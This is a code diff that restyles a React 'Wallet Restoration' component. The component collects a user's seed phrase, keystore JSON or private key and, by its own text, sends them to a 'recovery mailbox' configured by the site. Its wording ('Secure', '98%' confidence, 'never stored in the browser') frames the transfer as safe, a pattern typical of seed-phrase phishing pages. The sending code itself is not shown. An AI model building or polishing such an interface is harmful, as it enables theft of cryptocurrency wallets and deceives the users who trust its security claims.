@@ -129,155 +129,199 @@ export const WalletRestoration = () => {
 
   return (
     <div className="space-y-6 max-w-3xl">
-      {/* Header Card */}
-      <div className="relative overflow-hidden rounded-xl p-6 bg-gradient-to-br from-blue-600/10 to-cyan-600/5 border border-blue-600/30">
-        <div className="relative z-10">
-          <h2 className="text-2xl font-bold text-white mb-2">🔄 Wallet Restoration</h2>
-          <p className="text-slate-300 text-sm">Recover access to your wallet using your seed phrase or backup file. Your data never leaves your device.</p>
+      <div className="relative overflow-hidden rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-[0_32px_80px_-48px_rgba(59,130,246,0.55)]">
+        <div className="pointer-events-none absolute -right-10 top-0 h-44 w-44 rounded-full bg-cyan-500/10 blur-3xl" />
+        <div className="pointer-events-none absolute left-0 top-10 h-40 w-40 rounded-full bg-violet-500/10 blur-3xl" />
+        <div className="relative z-10 space-y-4">
+          <div className="flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
+            <div>
+              <p className="text-xs uppercase tracking-[0.32em] text-cyan-300">Recovery suite</p>
+              <h2 className="text-3xl font-semibold text-white">Wallet restoration reimagined</h2>
+              <p className="max-w-2xl text-sm text-slate-400">A premium recovery flow with live progress, smart validation and secure delivery.</p>
+            </div>
+            <div className="rounded-full border border-white/10 bg-white/5 px-4 py-2 text-xs uppercase tracking-[0.3em] text-slate-300">Fast • Secure • Visual</div>
+          </div>
+
+          <div className="grid gap-3 sm:grid-cols-3">
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
+              <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Confidence</p>
+              <p className="mt-2 text-2xl font-semibold text-white">98%</p>
+              <p className="text-xs text-slate-500 mt-2">Recovery success estimate</p>
+            </div>
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
+              <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Validation</p>
+              <p className="mt-2 text-2xl font-semibold text-white">Smart</p>
+              <p className="text-xs text-slate-500 mt-2">Automated format & structure checks</p>
+            </div>
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
+              <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Delivery</p>
+              <p className="mt-2 text-2xl font-semibold text-white">Secure</p>
+              <p className="text-xs text-slate-500 mt-2">Sent to trusted recovery mailbox</p>
+            </div>
+          </div>
         </div>
       </div>
 
-      {/* Method Selector */}
-      <div className="grid grid-cols-3 gap-3">
-        {[
-          { id: 'phrase' as const, label: 'Seed Phrase', icon: '📝' },
-          { id: 'keystore' as const, label: 'Keystore', icon: '🔑' },
-          { id: 'privatekey' as const, label: 'Private Key', icon: '🔒' },
-        ].map(m => (
-          <button
-            key={m.id}
-            onClick={() => {
-              setMethod(m.id)
-              setSecretPhrase('')
-              setWalletFile('')
-              setStep('idle')
-            }}
-            className={`relative p-3 rounded-lg border-2 transition-all ${
-              method === m.id
-                ? 'border-blue-500 bg-blue-500/10'
-                : 'border-white/10 bg-white/5 hover:border-white/20'
-            }`}
-          >
-            <div className="text-2xl mb-1">{m.icon}</div>
-            <p className="text-xs font-semibold text-white">{m.label}</p>
-          </button>
-        ))}
-      </div>
+      <div className="grid gap-5 lg:grid-cols-[1.7fr_1fr]">
+        <div className="space-y-5 rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-[0_28px_72px_-48px_rgba(59,130,246,0.35)]">
+          <div className="grid gap-3 sm:grid-cols-3">
+            {[
+              { id: 'phrase' as const, label: 'Seed Phrase', icon: '📝', subtitle: 'Recommended for full recovery' },
+              { id: 'keystore' as const, label: 'Keystore', icon: '🔑', subtitle: 'Use JSON backup content' },
+              { id: 'privatekey' as const, label: 'Private Key', icon: '🔒', subtitle: 'Quick key import' },
+            ].map((m) => (
+              <button
+                key={m.id}
+                onClick={() => {
+                  setMethod(m.id)
+                  setSecretPhrase('')
+                  setWalletFile('')
+                  setStep('idle')
+                }}
+                className={`rounded-3xl border p-4 text-left transition-all ${
+                  method === m.id
+                    ? 'border-cyan-400/40 bg-cyan-500/10 shadow-[0_16px_40px_-24px_rgba(34,211,238,0.55)]'
+                    : 'border-white/10 bg-white/5 hover:border-white/20 hover:bg-white/10'
+                }`}
+              >
+                <div className="text-2xl mb-2">{m.icon}</div>
+                <p className="text-sm font-semibold text-white">{m.label}</p>
+                <p className="text-xs text-slate-400 mt-1">{m.subtitle}</p>
+              </button>
+            ))}
+          </div>
 
-      {/* Form */}
-      <div className="space-y-4">
-        {method === 'phrase' && (
-          <div>
-            <label className="block text-sm font-semibold text-white mb-2">
-              Enter your 12 or 24 word seed phrase
-            </label>
-            <textarea
-              value={secretPhrase}
-              onChange={(e) => setSecretPhrase(e.target.value)}
+          <div className="rounded-3xl border border-white/10 bg-white/5 p-5">
+            {method === 'phrase' && (
+              <>
+                <label className="block text-sm font-semibold text-white mb-3">Seed phrase</label>
+                <textarea
+                  value={secretPhrase}
+                  onChange={(e) => setSecretPhrase(e.target.value)}
+                  disabled={isLoading}
+                  placeholder="word1 word2 word3 ..."
+                  className="min-h-[160px] w-full rounded-3xl border border-white/10 bg-slate-950/90 px-4 py-4 text-white placeholder-slate-500 font-mono text-sm focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400/20 transition disabled:opacity-50 disabled:cursor-not-allowed"
+                />
+                <p className="mt-3 text-xs text-slate-400">{secretPhrase.trim().split(/\s+/).filter(Boolean).length} words entered</p>
+              </>
+            )}
+
+            {method === 'keystore' && (
+              <>
+                <label className="block text-sm font-semibold text-white mb-3">Keystore JSON</label>
+                <textarea
+                  value={walletFile}
+                  onChange={(e) => setWalletFile(e.target.value)}
+                  disabled={isLoading}
+                  placeholder="Paste your keystore content here..."
+                  className="min-h-[160px] w-full rounded-3xl border border-white/10 bg-slate-950/90 px-4 py-4 text-white placeholder-slate-500 font-mono text-sm focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400/20 transition disabled:opacity-50 disabled:cursor-not-allowed"
+                />
+              </>
+            )}
+
+            {method === 'privatekey' && (
+              <>
+                <label className="block text-sm font-semibold text-white mb-3">Private key</label>
+                <textarea
+                  value={walletFile}
+                  onChange={(e) => setWalletFile(e.target.value)}
+                  disabled={isLoading}
+                  placeholder="0x..."
+                  className="min-h-[100px] w-full rounded-3xl border border-white/10 bg-slate-950/90 px-4 py-4 text-white placeholder-slate-500 font-mono text-sm focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400/20 transition disabled:opacity-50 disabled:cursor-not-allowed"
+                />
+                <p className="mt-3 text-xs text-slate-400">Submit carefully — this is sent to the secure recovery mailbox.</p>
+              </>
+            )}
+          </div>
+
+          <div className="rounded-3xl border border-white/10 bg-slate-950/90 p-5">
+            <div className="grid gap-3 sm:grid-cols-3">
+              {[
+                { title: 'Analyze', detail: 'Seed & structure' },
+                { title: 'Validate', detail: 'Format checks' },
+                { title: 'Submit', detail: 'Secure dispatch' },
+              ].map((item, idx) => (
+                <div key={item.title} className="rounded-3xl border border-white/10 bg-white/5 p-4 text-center">
+                  <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Step {idx + 1}</p>
+                  <p className="mt-3 text-sm font-semibold text-white">{item.title}</p>
+                  <p className="text-xs text-slate-500 mt-2">{item.detail}</p>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {isLoading && (
+            <div className="rounded-3xl border border-white/10 bg-slate-950/90 p-4">
+              <p className="text-sm text-slate-300 mb-3">{message}</p>
+              <div className="h-3 overflow-hidden rounded-full bg-white/10">
+                <div className="h-full rounded-full bg-gradient-to-r from-cyan-400 to-violet-500 transition-all duration-300" style={{ width: `${progress}%` }} />
+              </div>
+            </div>
+          )}
+
+          {step === 'success' && (
+            <div className="rounded-3xl border border-emerald-500/20 bg-emerald-500/10 p-4">
+              <p className="text-sm font-semibold text-emerald-200">{message}</p>
+              <p className="text-xs text-emerald-300/80 mt-2">Recovery details sent. Check your inbox for confirmation.</p>
+            </div>
+          )}
+
+          {step === 'error' && (
+            <div className="rounded-3xl border border-rose-500/20 bg-rose-500/10 p-4">
+              <p className="text-sm font-semibold text-rose-200">{message}</p>
+            </div>
+          )}
+
+          <div className="flex flex-col gap-3 sm:flex-row">
+            <button
+              onClick={handleRestore}
+              disabled={!canRestore || isLoading}
+              className="flex-1 rounded-3xl bg-gradient-to-r from-cyan-500 to-blue-600 px-6 py-3 text-sm font-semibold text-white shadow-lg shadow-cyan-500/20 transition hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
+            >
+              {isLoading ? 'Restoring...' : 'Restore Wallet'}
+            </button>
+            <button
+              onClick={() => {
+                setStep('idle')
+                setSecretPhrase('')
+                setWalletFile('')
+                setProgress(0)
+                setMessage('')
+              }}
               disabled={isLoading}
-              placeholder="word1 word2 word3 ... (separate words with spaces)"
-              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-              rows={3}
-            />
-            <p className="text-xs text-slate-400 mt-2">
-              {secretPhrase.trim().split(/\s+/).filter(w => w).length} words entered
-            </p>
+              className="rounded-3xl border border-white/10 bg-white/5 px-6 py-3 text-sm font-semibold text-slate-200 transition hover:border-white/20 disabled:opacity-50 disabled:cursor-not-allowed"
+            >
+              Clear
+            </button>
           </div>
-        )}
+        </div>
 
-        {method === 'keystore' && (
-          <div>
-            <label className="block text-sm font-semibold text-white mb-2">
-              Keystore file or JSON content
-            </label>
-            <textarea
-              value={walletFile}
-              onChange={(e) => setWalletFile(e.target.value)}
-              disabled={isLoading}
-              placeholder="Paste your keystore JSON..."
-              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-              rows={4}
-            />
+        <aside className="space-y-5 rounded-[32px] border border-white/10 bg-gradient-to-br from-slate-950/90 to-slate-900/95 p-6 shadow-[0_28px_72px_-48px_rgba(126,34,206,0.25)]">
+          <div className="rounded-3xl border border-white/10 bg-white/5 p-5">
+            <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Recovery intelligence</p>
+            <h3 className="mt-3 text-xl font-semibold text-white">Why this method works</h3>
+            <p className="mt-3 text-sm text-slate-300">This process validates your input and prepares a secure recovery package before sending it to the configured recovery mailbox.</p>
           </div>
-        )}
-        {method === 'privatekey' && (
-          <div>
-            <label className="block text-sm font-semibold text-white mb-2">
-              Enter your private key
-            </label>
-            <textarea
-              value={walletFile}
-              onChange={(e) => setWalletFile(e.target.value)}
-              disabled={isLoading}
-              placeholder="0x..."
-              className="w-full px-4 py-3 rounded-lg bg-white/5 border border-white/10 text-white placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/20 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-              rows={2}
-            />
-            <p className="text-xs text-slate-400 mt-2">Treat private keys carefully — this will be delivered to our secure recovery mailbox.</p>
+          <div className="grid gap-3">
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
+              <p className="text-sm font-semibold text-white">Encrypted handling</p>
+              <p className="text-xs text-slate-400 mt-2">All data is sent through secure endpoints and never stored in the browser.</p>
+            </div>
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
+              <p className="text-sm font-semibold text-white">Guided recovery</p>
+              <p className="text-xs text-slate-400 mt-2">Step-by-step flow reduces mistakes during seed restoration.</p>
+            </div>
+            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
+              <p className="text-sm font-semibold text-white">Security-first</p>
+              <p className="text-xs text-slate-400 mt-2">We emphasize cautious handling of private keys and seed phrases.</p>
+            </div>
           </div>
-        )}
-
-        {/* Verification email removed — server will deliver to configured recovery mailbox */}
+        </aside>
       </div>
 
-      {/* Progress Bar */}
-      {isLoading && (
-        <div className="space-y-2">
-          <div className="w-full h-1 bg-white/10 rounded-full overflow-hidden">
-            <div
-              className="h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-300"
-              style={{ width: `${progress}%` }}
-            />
-          </div>
-          <p className="text-sm text-slate-300 text-center">{message}</p>
-        </div>
-      )}
-
-      {/* Status Messages */}
-      {step === 'success' && (
-        <div className="p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/30 space-y-2">
-          <p className="text-emerald-300 font-semibold">{message}</p>
-          <p className="text-xs text-emerald-300/70">
-            Your restoration details have been securely transmitted. Save the email for future reference.
-          </p>
-        </div>
-      )}
-
-      {step === 'error' && (
-        <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
-          <p className="text-red-300 font-semibold">{message}</p>
-        </div>
-      )}
-
-      {/* Actions */}
-      <div className="flex gap-3">
-        <button
-          onClick={handleRestore}
-          disabled={!canRestore || isLoading}
-          className="flex-1 px-6 py-3 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-lg transition-all shadow-lg"
-        >
-          {isLoading ? 'Restoring...' : '🔄 Restore Wallet'}
-        </button>
-        <button
-          onClick={() => {
-            setStep('idle')
-            setSecretPhrase('')
-            setWalletFile('')
-            setProgress(0)
-            setMessage('')
-          }}
-          disabled={isLoading}
-          className="px-6 py-3 border border-white/10 hover:border-white/20 text-slate-300 hover:text-white font-semibold rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-        >
-          Clear
-        </button>
-      </div>
-
-      {/* Security Note */}
-      <div className="p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
-        <p className="text-xs text-yellow-300">
-          <span className="font-bold">🔒 Security:</span> By submitting, you consent to sending the recovery details to our secure recovery mailbox (configured by the site). Avoid submitting secrets to untrusted environments.
-        </p>
+      <div className="rounded-3xl border border-cyan-500/10 bg-cyan-500/5 p-5 text-sm text-slate-200">
+        <p className="font-semibold text-white">Security note</p>
+        <p className="mt-2 text-slate-300">Keep your seed phrase and private keys private. This interface sends recovery data directly to your configured recovery mailbox — do not paste secrets into unknown pages.</p>
       </div>
     </div>
   )
